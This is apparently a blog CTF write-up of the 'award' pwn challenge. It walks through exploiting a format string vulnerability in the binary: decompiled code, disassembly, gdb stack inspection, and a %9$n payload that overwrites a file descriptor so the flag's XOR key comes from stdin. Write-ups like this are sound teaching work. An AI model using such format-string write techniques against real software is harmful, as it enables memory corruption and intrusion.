+++
author = "Lenart"
title = "award - issue in printf formatters"
date = "2024-04-27"
description = "Everyone gets award."
tags = [
"ctf",
"pwn",
"binary exploitation",
]
+++

# Award

Everyone gets an award.

This challenge got me really crazy, despite it being super easy, but I got
the wrong direction because of my decompiler misdirecting (nice work Ghidra).
I later checked it in IDA and directly got the idea, but it still took me some
time to figure out how to exploit it practically.

So we are given an ELF binary file, protected with all the modern protections.
The binary is also stripped, so no debug symbols.

Here is a pseudocode of what it would look like:

```c
void xor(char *flag_buffer, char *random, char *ret_val) {
    int i;
    
    for (i = 0; i < 0x20; i = i + 1) {
      ret_val[i] = flag_buffer[i] ^ random[i];
    }
    return;
}

int main() {
    int fd;
    int fd0;
    int *local_a0;
    // other variables would be here
    // ....

    puts("Who the reward is for ?");
    fgets(user_input, 32, stdin);
    fd = open("flag.txt", 0);
    if (fd == -1) {
      perror("Error opening flag");
      exit(1);
    }
    for (i = 0; i < 32; i = i + 1) {
      *(undefined *)((long)&random_buffer + (long)i) = 0;
    }
    fd0 = open("/dev/urandom", 0);
    local_a0 = &fd0;
    printf(user_input);
    sVar1 = read(fd0, &random_buffer, 32);
    local_a4 = (undefined4)sVar1;
    read(fd, &flag_buffer, 32);
    xor((char *)&flag_buffer, (char *)&random_buffer, (char *)&ret_val);
    printf("Here is your secret award: ");
    for (local_ac = 0; local_ac < 0x20; local_ac = local_ac + 1) {
      putchar((uint)*(byte *)((long)&ret_val + (long)local_ac));
    }
    putchar(10);
}
```

So, the code basically reads some random bytes from **/dev/urandom**, which is
practically impossible to predict. It then reads the flag and XORs it with the
random bytes.

Interestingly, there is a user input buffer which we control. It is
then printed directly without any formatter. We can, without any hesitation, assume
it is a format string vulnerability.

And note that we have an `int *` which points to the `fd0`, this would come handy later.

Although it is clearly a format string vulnerability, it's not as easy as it sounds.
I spent too much time trying to dereference what is on the stack within a really wide range
because I was too n00b and didn't realize that when printing the buffer there is not
anything valuable on the stack. Actually, the flag and even random bytes are read after the printf.
That's when I realized the only valuable things we have on the stack are the file descriptors,
so we may control them and exploit to our gains.
My thought then was; let's set the second file descriptor, the one where we read to the random buffer, to 0.
This way we can control the key used to XOR the flag and bingo we got the flag.

So, the strategy is, set the file descriptor of the first write, which is referred to as `fd0` in the code,
to 0. We then feed the program with our controlled key, then we decrypt the flag using it.
You may know the XOR property:

```python
if a ^ b = c then c ^ b = a
```

> Actually, we don't even need to decrypt it. If we send nothing the flag would not be encrypted.

The problem with `printf` is, if we don't specify the formatters and directly give the user input,
a malicious user can use their own formatters to confuse and exploit it. For example:
`printf(user_input)` a user can give `%s` as input, and printf thinks there is some string to
dereference and print out. By convention, it would look at registers until the 5th argument and then
go to the stack. So using `%s %s %s %s %s %s` would print out what's in the first five registers
and then go to the first value on the stack.

That is great, but unfortunately for us, there is nothing interesting to read in the registers,
neither on the stack. Fortunately for us, there is a formatter that allows us to write
arbitrary bytes to a location on the stack.

```bahs
man 3 printf
n      The number of characters written so far is stored into the integer pointed
       to by the corresponding argument.
```

But it also says:

```
That argument shall be an int *, or  variant  whose size  matches the (optionally) supplied integer length modifier.
```

Not a great news, we can't write to fd, but recall the `int *` that points to the fd, we can write into it.

So if we spot the location where the `local_a0` or whatever doesn't matter is stored, we can eventually `write 0` to it,
using `%42$x` tells `printf` to print out what is at the location `42` instead of the first register
or the first value on the stack, so we need to find out where the `local_a0` is stored on the stack.

So, running the program using GDB and starting as it is stripped, we can't just set a breakpoint at main.
We can spot where the actual main starts.

Here is what the disassembled code looks like:

```asm
   0x555555555307:	call   0x555555555040 <puts@plt>
   0x55555555530c:	mov    rdx,QWORD PTR [rip+0x2d5d]        # 0x555555558070 <stdin>
   0x555555555313:	lea    rax,[rbp-0x30]
   0x555555555317:	mov    esi,0x20
   0x55555555531c:	mov    rdi,rax
   0x55555555531f:	call   0x555555555080 <fgets@plt>
   0x555555555324:	mov    esi,0x0
   0x555555555329:	lea    rax,[rip+0xcec]        # 0x55555555601c
   0x555555555330:	mov    rdi,rax
   0x555555555333:	mov    eax,0x0
   0x555555555338:	call   0x5555555550a0 <open@plt>
   0x55555555533d:	mov    DWORD PTR [rbp-0xa0],eax
   0x555555555343:	cmp    DWORD PTR [rbp-0xa0],0xffffffff
   0x55555555534a:	jne    0x555555555365
   0x55555555534c:	lea    rax,[rip+0xcd2]        # 0x555555556025
   0x555555555353:	mov    rdi,rax
   0x555555555356:	call   0x5555555550b0 <perror@plt>
   0x55555555535b:	mov    edi,0x1
   0x555555555360:	call   0x5555555550c0 <exit@plt>
   0x555555555365:	mov    DWORD PTR [rbp-0xa8],0x0
   0x55555555536f:	jmp    0x555555555388
   0x555555555371:	mov    eax,DWORD PTR [rbp-0xa8]
   0x555555555377:	cdqe
   0x555555555379:	mov    BYTE PTR [rbp+rax*1-0x90],0x0
   0x555555555381:	add    DWORD PTR [rbp-0xa8],0x1
   0x555555555388:	cmp    DWORD PTR [rbp-0xa8],0x1f
   0x55555555538f:	jle    0x555555555371
   0x555555555391:	mov    esi,0x0
   0x555555555396:	lea    rax,[rip+0xc9b]        # 0x555555556038
   0x55555555539d:	mov    rdi,rax
   0x5555555553a0:	mov    eax,0x0
   0x5555555553a5:	call   0x5555555550a0 <open@plt>
   0x5555555553aa:	mov    DWORD PTR [rbp-0xac],eax
   0x5555555553b0:	lea    rax,[rbp-0xac]
   0x5555555553b7:	mov    QWORD PTR [rbp-0x98],rax
   0x5555555553be:	lea    rax,[rbp-0x30]
   0x5555555553c2:	mov    rdi,rax
   0x5555555553c5:	mov    eax,0x0
   0x5555555553ca:	call   0x555555555060 <printf@plt>
```

The `fgets` is where we put our input (actually it reads up to 32 bytes), and `printf` is where we are interested in,
so we put a breakpoint right before hitting it.

```bash
pwndbg> b *0x5555555553ca
Breakpoint 2 at 0x5555555553ca
pwndbg> c
Continuing.
Who the reward is for ?
AAAAAAAA
```

looking at the stack layout:

```bash
pwndbg> x/20gx $rsp
0x7fffffffe4b0:	0x0000000400008000	0x0000000000000020
0x7fffffffe4c0:	0x0000000000000003	0x00007fffffffe4b4
0x7fffffffe4d0:	0x0000000000000000	0x0000000000000000
0x7fffffffe4e0:	0x0000000000000000	0x0000000000000000
0x7fffffffe4f0:	0x0000000000000000	0x0000000000000000
0x7fffffffe500:	0x0000000000000000	0x0000000000000000
0x7fffffffe510:	0x0000000000000000	0x000000000000000
```

It took me a little time to figure out where `local_a0` was (I was originally looking for fd0). 
I could already see that `0x7fffffffe4c0` at the first 8 bytes points to `0x0000000000000003`
which is the file descriptor of the flag file. 
The next is interesting, it seems like an address which gives a hint of the local_a0 pointer.
There is a similar address ```0x7fffffffe4b0:	0x0000000400008000``` the address is ```0x00007fffffffe4b4```
So it clearly points to ```0x00000004```.

```bash
pwndbg> x 0x00007fffffffe4b4
0x7fffffffe4b4:	0x0000002000000004
```

So we know the first 5 parameters are passed by registers to printf, so the first value
on the stack is the 6th for printf. Thus, writing `%6$x` would print out `0x0000000400008000`.
What we are interested in is the 9th value, `0x00007fffffffe4b4`.

```bash
~/D/c/i/p/award ❯❯❯ ./award
Who the reward is for ?
%9$n

aaaaaaaaaaaaaaaaaaaaaaaa
Here is your secret award: kaaaaaaa
~/D/c/i/p/award ❯❯❯
```

As you see, we managed to write from stdin, and that is used to XOR the secret. From now
on, it takes a simple exploit script to get the flag :).


